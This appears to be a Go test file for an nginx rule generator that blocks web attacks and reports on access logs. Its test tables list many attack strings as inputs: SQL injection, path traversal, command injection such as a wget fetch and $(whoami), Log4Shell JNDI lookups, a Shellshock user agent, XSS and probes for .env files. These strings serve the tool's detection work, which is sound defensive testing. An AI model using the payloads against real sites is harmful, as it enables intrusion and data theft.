package main

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func shippedMaps(t *testing.T) map[string]nginxMap {
	t.Helper()
	maps, err := parseNginxMaps(string(nginxRulesConf))
	if err != nil {
		t.Fatal(err)
	}
	return maps
}

func TestNginxRules(t *testing.T) {
	maps := shippedMaps(t)
	for uri, want := range map[string]string{
		"/p?id=1+UNION+ALL+SELECT+1,2":                   "sqli-union",
		"/p?id=1%20union%20select%201":                   "sqli-union",
		"/p?id=1/**/UNION/**/SELECT/**/1":                "sqli-union",
		"/p?id=1%0aUNION%0ASELECT%0a1":                   "sqli-union",
		"/p?id=1+/*!50000UNION*/+/*!50000SELECT*/+1":     "sqli-union",
		"/p?id=-1%27%29+union(select(1))":                "sqli-union",
		"/news/1+union+select+1":                         "sqli-union",
		"/p?id=1%27%20or%201=1":                          "sqli-quote",
		"/p?id=1'+or+'1'='1":                             "sqli-quote",
		"/p?id=1%27%20OR%20%27a%27%3D%27a":               "sqli-quote",
		`/p?id=1\x22+or+\x22\x22=\x22`:                   "sqli-quote", // as nginx logs a raw "
		"/p?id=1')+or+1--+-":                             "sqli-quote",
		"/p?id=1+and+1=1":                                "sqli-number",
		"/p?id=-1%20or%202%3E1":                          "sqli-number",
		"/p?id=1+order+by+10":                            "sqli-orderby",
		"/p?id=sleep(5)":                                 "sqli-function",
		"/p?id=1;waitfor%20delay%20%270:0:5%27":          "sqli-function",
		"/p?id=extractvalue(1,concat(0x7e,version()))":   "sqli-function",
		"/p?id=1+into+outfile+'/tmp/x'":                  "sqli-file",
		"/p?t=x+from+information_schema.tables":          "sqli-schema",
		"/blog?q=select+the+best+plan+from+list":         "",
		"/docs?q=information_schema":                     "",
		"/?q=union+station":                              "",
		"/credit-union-select":                           "",
		"/?q=d'or+amarelo":                               "",
		"/?q=rock'n'roll+and+blues":                      "",
		"/?q=%27windows%27+and+10":                       "",
		"/?q=sleep(ing)":                                 "",
		"/?q=into+the+file":                              "",
		"/?page=2&sort=order&by=1":                       "",
		"/?qtd=10+e+20&total=30":                         "",
		"/?q=S%C3%A3o+Paulo+e+regi%C3%A3o&or=1&and=2":    "",
		"/login.php?return=%2Fadmin%2Findex.php%3Fa%3D1": "",
		"/": "",

		"/view.php?f=../../../../etc/passwd":                            "traversal",
		"/view.php?f=..%2f..%2fconfig":                                  "traversal",
		"/view.php?f=%252e%252e%252f%252e%252e%252f":                    "traversal",
		`/view.php?f=..\\..\\boot.ini`:                                  "traversal", // logged as \\\\
		"/view.php?f=/etc/passwd":                                       "lfi",
		"/view.php?f=x.php%00.jpg":                                      "nullbyte",
		"/view.php?f=php://filter/convert.base64-encode/resource=index": "wrapper",
		"/view.php?f=data:text/plain,hello":                             "wrapper",
		"/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input": "phpini",
		"/ping.php?h=1;wget+http://x/y":                                 "command",
		"/ping.php?h=1%7Ccat+/etc/x":                                    "command",
		"/ping.php?h=$(whoami)":                                         "command",
		"/x.php?c=system('id')":                                         "code",
		"/x.php?o=O:8:%22stdClass%22:0:{}":                              "object",
		"/x.php?GLOBALS[a]=1":                                           "globals",
		"/x?a=${jndi:ldap://x/y}":                                       "jndi",
		"/?q=%3Cscript%3Ealert(1)%3C/script%3E":                         "xss",
		"/?q=<img+src=x+onerror=alert(1)>":                              "xss",
		"/?u=javascript:alert(1)":                                       "xss",
		"/.env":                                                         "dotfile",
		"/app/.git/config":                                              "dotfile",
		"/%2egit/HEAD":                                                  "dotfile",
		"/dump.sql.gz":                                                  "backup",
		"/config.php.bak":                                               "backup",
		"/index.php~":                                                   "backup",
		"/backup.zip":                                                   "backup",
		"/composer.lock":                                                "config",
		"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php":           "probe",
		"/adminer-4.8.1.php":                                            "probe",
		"/uploads/2026/x.php":                                           "upload-php",
		"/uploads/x.php/a.jpg":                                          "upload-php",

		"/.well-known/acme-challenge/abc":              "",
		"/uploads/2026/photo.jpg":                      "",
		"/index.php?return=../index.php":               "", // a single ../ is common in old apps
		"/wp-login.php":                                "", // the cms rule is off by default
		"/files/report.zip":                            "",
		"/?q=ecosystem(natural)":                       "",
		"/?tags=dog|cat|bird":                          "",
		"/?q=a;id=2":                                   "",
		"/?q=price+<+100":                              "",
		"/?email=a%40b.com&url=https%3A%2F%2Fx.com%2F": "",
		"/?data:text=1":                                "",
		"/oldsite/history.php":                         "",
		"/?a[]=1&b[x]=2":                               "",
		"/?o=a:1:{i:0;s:1:%22x%22;}":                   "", // serialized array
		"/shell-scripting.html":                        "",
		"/cache/style.css":                             "",
	} {
		if got := nginxRule(maps, uri, "Mozilla/5.0"); got != want {
			t.Errorf("%s: rule %q, want %q", uri, got, want)
		}
	}
}

func TestNginxExceptions(t *testing.T) {
	conf := strings.NewReplacer(
		`# "~^/admin/reports/" 1;`, `"~^/admin/reports/" 1;`,
		`# "/search.php" 1;`, `"/search.php" 1; # site search`,
		`# "~*%(?:4`, `"~*%(?:4`,
	).Replace(string(nginxRulesConf))
	maps, err := parseNginxMaps(conf)
	if err != nil {
		t.Fatal(err)
	}
	const q = "?q=1+union+select+1"
	for uri, want := range map[string]string{
		"/admin/reports/x" + q:               "",
		"/admin/./reports//x" + q:            "",
		"/%61dmin/reports/x" + q:             "", // union wins over encoded, then the exception applies
		"/search.php" + q:                    "",
		"/admin/reports/../../a.php" + q:     "sqli-union", // not a way around
		"/admin/reports/%2e%2e/%2e%2e/a" + q: "sqli-union",
		"/search.php/." + q:                  "sqli-union", // nginx: /search.php/
		"/search.php/x/.." + q:               "sqli-union",
		"/admin/reports/." + q:               "",
		"/search.php/x" + q:                  "sqli-union",
		"/p?id=1+%55NION+SELECT+1":           "encoded",
		"/p?q=caf%C3%A9+%2B+p%C3%A3o":        "",
	} {
		if got := nginxRule(maps, uri, "Mozilla/5.0"); got != want {
			t.Errorf("%s: rule %q, want %q", uri, got, want)
		}
	}
}

func TestParseNginxMapsErrors(t *testing.T) {
	for _, conf := range []string{
		"",
		"map $a $sg_uri {\n\"~*x\" r;\n", // never closed
		"map $a $sg_uri {\n\"~*(?!x)y\" r;\n}",
		"map $a $sg_uri {\ninclude other.conf extra;\n}",
		"map $a $sg_uri {\n\"~x\" r;\ninclude extra.rules;\n}",
		"map $a $sg_uri\n{\n\"~x\" r;\n}\nmap $b $sg_path {\n\"~x\" r;\n}",
		"map $a $sg_uri {\ndefault \"\";\n}",
	} {
		if _, err := parseNginxMaps(conf); err == nil {
			t.Errorf("accepted %q", conf)
		}
	}
}

func TestNginxTestReport(t *testing.T) {
	in := strings.Join([]string{
		`198.51.100.1 - - [25/Nov/2026:10:00:00 -0300] "GET /p?id=1+union+select+1 HTTP/1.1" 200 1 "-" "x"`,
		`198.51.100.2 - - [25/Nov/2026:10:00:00 -0300] "GET /p?id=1+union+select+1 HTTP/1.1" 200 1 "-" "x"`,
		`198.51.100.2 - - [25/Nov/2026:10:00:00 -0300] "GET /ok HTTP/1.1" 200 1 "http://a/?q=1+union+select+1" "x"`,
		`198.51.100.3 - - [25/Nov/2026:10:00:00 -0300] "\x16\x03\x01" 400 1 "-" "-"`,
	}, "\n")
	var out bytes.Buffer
	if err := nginxTest(shippedMaps(t), strings.NewReader(in), &out); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"4 lines, 3 requests, 2 would be blocked", "rule sqli-union: 2 requests, 2 clients", "2  /p?id=1+union+select+1"} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("missing %q in:\n%s", want, out.String())
		}
	}
}

func TestLogClient(t *testing.T) {
	for line, want := range map[string]string{
		`198.51.100.1 - - [25/Nov/2026:10:00:00 -0300] "GET / HTTP/1.1" 200 1 "-" "x"`:                      "198.51.100.1",
		`tools.example.com 198.51.100.2 - - [25/Nov/2026:10:00:00 -0300] "GET / HTTP/1.1" 200 1 "-" "x"`:    "198.51.100.2",
		`tools.example.com 2001:db8::7 - - [25/Nov/2026:10:00:00 -0300] "GET / HTTP/1.1" 200 1 "-" "x"`:     "2001:db8::7",
		`198.51.100.3 - [25/Nov/2026:10:00:00 -0300] "GET / HTTP/1.1" 403 rule=sqli-union host=a "x"`:       "198.51.100.3",
		`unix: - - [25/Nov/2026:10:00:00 -0300] "GET / HTTP/1.1" 200 1 "-" "x"`:                             "unix:",
		`site.example 198.51.100.4 - 203.0.113.9 [25/Nov/2026:10:00:00 -0300] "GET / HTTP/1.1" 200 1 "" ""`: "198.51.100.4", // $remote_user comes after
		``: "",
	} {
		if got := logClient(line); got != want {
			t.Errorf("%q: %q, want %q", line, got, want)
		}
	}

	in := strings.Join([]string{
		`a.example 198.51.100.1 - - [25/Nov/2026:10:00:00 -0300] "GET /.env HTTP/1.1" 404 1 "-" "x" rt=0.001`,
		`b.example 198.51.100.1 - - [25/Nov/2026:10:00:00 -0300] "GET /.env HTTP/1.1" 404 1 "-" "x" rt=0.001`,
		`b.example 198.51.100.2 - - [25/Nov/2026:10:00:00 -0300] "GET /.git/config HTTP/1.1" 404 1 "-" "x" rt=0.001`,
	}, "\n")
	var out bytes.Buffer
	if err := nginxTest(shippedMaps(t), strings.NewReader(in), &out); err != nil || !strings.Contains(out.String(), "rule dotfile: 3 requests, 2 clients") {
		t.Errorf("err %v, report:\n%s", err, out.String())
	}
}

func TestNginxInit(t *testing.T) {
	dir := t.TempDir()
	if err := nginxInit(dir, nil, &bytes.Buffer{}); err == nil {
		t.Fatal("accepted a directory without conf.d")
	}
	if err := os.Mkdir(filepath.Join(dir, "conf.d"), 0o755); err != nil {
		t.Fatal(err)
	}

	var out bytes.Buffer
	if err := nginxInit(dir, nil, &out); err != nil {
		t.Fatal(err)
	}
	if n := strings.Count(out.String(), "created "); n != 3 {
		t.Errorf("created %d files:\n%s", n, out.String())
	}

	// An edited file survives a second run, a missing one comes back.
	rules, server := filepath.Join(dir, nginxRulesFile), filepath.Join(dir, nginxServerFile)
	if err := os.WriteFile(rules, []byte("mine"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(server); err != nil {
		t.Fatal(err)
	}
	if err := nginxInit(dir, nil, &bytes.Buffer{}); err != nil {
		t.Fatal(err)
	}
	if got, _ := os.ReadFile(rules); string(got) != "mine" {
		t.Errorf("overwrote the edited rules: %q", got)
	}
	if got, _ := os.ReadFile(server); !bytes.Equal(got, nginxServerConf) {
		t.Errorf("server.conf not restored: %q", got)
	}
}

func TestNginxAgents(t *testing.T) {
	maps := shippedMaps(t)
	for agent, want := range map[string]string{
		"sqlmap/1.8#stable (https://sqlmap.org)":                 "scanner",
		"Mozilla/5.0 (compatible; Nmap Scripting Engine)":        "scanner",
		"() { :; }; /bin/bash -c id":                             "shellshock",
		"${jndi:ldap://x}":                                       "jndi",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0": "",
		"Googlebot/2.1 (+http://www.google.com/bot.html)":        "",
		"curl/8.5.0": "",
		"-":          "", // empty-agent is off by default
	} {
		if got := nginxRule(maps, "/", agent); got != want {
			t.Errorf("%s: rule %q, want %q", agent, got, want)
		}
	}

	line := `198.51.100.1 - - [25/Nov/2026:10:00:00 -0300] "GET / HTTP/1.1" 200 1 "-" "sqlmap/1.8"`
	var out bytes.Buffer
	if err := nginxTest(maps, strings.NewReader(line), &out); err != nil || !strings.Contains(out.String(), "rule scanner: 1 requests") {
		t.Errorf("err %v, report:\n%s", err, out.String())
	}
}

func TestNginxProxy(t *testing.T) {
	proxies, err := parseProxies("cloudflare, 172.18.0.0/16,10.0.0.5")
	if err != nil || len(proxies) != len(cloudflareRanges)+2 {
		t.Fatalf("%v, %v", proxies, err)
	}
	for _, bad := range []string{"0.0.0.0/0", "::/0", "128.0.0.0/1", "cloudfare", "10.0.0.5;", "1.2.3.4/33"} {
		if _, err := parseProxies(bad); err == nil {
			t.Errorf("accepted %q", bad)
		}
	}

	dir := t.TempDir()
	if err := os.Mkdir(filepath.Join(dir, "conf.d"), 0o755); err != nil {
		t.Fatal(err)
	}
	var out bytes.Buffer
	if err := nginxInit(dir, proxies, &out); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out.String(), "172.18.0.0/16, 10.0.0.5]") {
		t.Errorf("no ignore line:\n%s", out.String())
	}
	got, _ := os.ReadFile(filepath.Join(dir, nginxRealIPFile))
	for _, want := range []string{"set_real_ip_from 10.0.0.5;", "set_real_ip_from 2a06:98c0::/29;", "real_ip_recursive on;"} {
		if !strings.Contains(string(got), want) {
			t.Errorf("missing %q in:\n%s", want, got)
		}
	}
}

// The example rules, uncommented, must match what nginx logs.
func TestNginxAgentRules(t *testing.T) {
	raw, err := os.ReadFile("packaging/agent.yaml")
	if err != nil {
		t.Fatal(err)
	}
	yaml := strings.NewReplacer("  # - name", "  - name", "  #   ", "    ").Replace(string(raw))
	p := filepath.Join(t.TempDir(), "agent.yaml")
	if err := os.WriteFile(p, []byte(yaml), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg, err := loadConfig(p)
	if err != nil {
		t.Fatal(err)
	}
	lines := map[string]string{
		"web_attack": `198.51.100.1 - [25/Nov/2026:10:00:00 +0000] "GET /.env HTTP/1.1" 403 rule=dotfile host=a.example "203.0.113.9 - ["`,
		"web_login":  `198.51.100.1 - - [25/Nov/2026:10:00:00 +0000] "POST /login.php HTTP/1.1" 429 169 "-" "x"`,
	}
	for _, r := range cfg.rules {
		line, ok := lines[r.Name]
		if !ok {
			continue
		}
		delete(lines, r.Name)
		if ip, _, ok := r.Match(line); !ok || ip.String() != "198.51.100.1" {
			t.Errorf("%s: got %v %v", r.Name, ip, ok)
		}
	}
	if len(lines) != 0 {
		t.Errorf("rules missing from agent.yaml: %v", lines)
	}
}

func TestParseNginxMapsComments(t *testing.T) {
	maps, err := parseNginxMaps("map $request_uri $sg_uri { # rules\n\"~x\" r; # why\n}")
	if err != nil || nginxRule(maps, "/x", "") != "r" {
		t.Errorf("%v, %v", maps, err)
	}
}

func TestNginxLoginPaths(t *testing.T) {
	login := shippedMaps(t)["sg_login"]
	for key, want := range map[string]bool{
		"POST:/login":            true,
		"POST:/login.php":        true,
		"POST:/admin/login/":     true,
		"POST:/wp-login.php":     true,
		"GET:/login.php":         false,
		"POST:/login-help":       false,
		"POST:/blog/mylogin.php": false,
		"POST:/contact.php":      false,
	} {
		if got := login.value(key) != ""; got != want {
			t.Errorf("%s: counted = %v, want %v", key, got, want)
		}
	}
}
